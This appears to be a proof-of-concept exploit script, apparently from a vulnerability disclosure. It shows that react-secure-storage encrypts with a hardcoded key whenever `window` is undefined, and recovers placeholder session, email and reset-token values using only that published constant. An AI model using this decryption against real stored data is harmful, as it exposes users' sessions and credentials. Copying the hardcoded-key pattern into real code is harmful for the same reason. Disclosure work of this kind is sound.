// ATTACK 2 — the universal hardcoded key (zero knowledge).
//
// fingerprint.ts:  if (typeof window === "undefined") return HASH_KEY_CUSTOM;
// With no env override, HASH_KEY_CUSTOM is the hardcoded constant
// "E86E2612010258B35137". So any time react-secure-storage runs where `window`
// is undefined — SSR / prerender, Next.js server components, React-Native-ish
// runtimes, Jest/Vitest, server-side crypto helpers — EVERY install on earth
// encrypts with the SAME key baked into the npm tarball.
//
// This script does NOT touch browser_env.js: `window` is genuinely undefined,
// exactly like a server render. The attacker needs nothing but the published
// constant (copy/pasted from the public source).
const fs = require("fs");
const path = require("path");
const CryptoJS = require("crypto-js");

// ---- VICTIM: encrypt with the REAL library, server-side ----
const EncryptionService = require("react-secure-storage/dist/encryption").default;
const getFingerprint = require("react-secure-storage/dist/fingerprint").default;

console.log("[attack2] typeof window =", typeof window, "(server-side render)");
console.log("[attack2] library's secureKey here =", JSON.stringify(getFingerprint()));

const SECRETS = {
  session: "EXAMPLE-not-a-real-key-ssr-session-aa11bb22",
  email: "victim@example-bank.test",
  reset_token: "EXAMPLE-not-a-real-key-pwreset-99ffee00",
};
const enc = new EncryptionService();
const leaked = {};
for (const [k, v] of Object.entries(SECRETS)) leaked[k] = enc.encrypt(v);
fs.writeFileSync(path.join(__dirname, "ssr_leaked.json"), JSON.stringify(leaked, null, 2));

// ---- ATTACKER: knows only the public constant from the open-source repo ----
const PUBLISHED_CONSTANT = "E86E2612010258B35137"; // github.com/sushinpv/react-secure-storage src/lib/fingerprint.ts#L5
console.log("[attack2] attacker decrypts with the published constant only:");
let ok = 0;
for (const [k, ct] of Object.entries(leaked)) {
  const pt = CryptoJS.AES.decrypt(ct, PUBLISHED_CONSTANT).toString(CryptoJS.enc.Utf8);
  if (pt === SECRETS[k]) ok++;
  console.log("    " + k.padEnd(12) + " = " + pt);
}
console.log(`[attack2] RESULT: ${ok}/${Object.keys(SECRETS).length} fields recovered with zero knowledge`);
process.exit(ok === Object.keys(SECRETS).length ? 0 : 1);
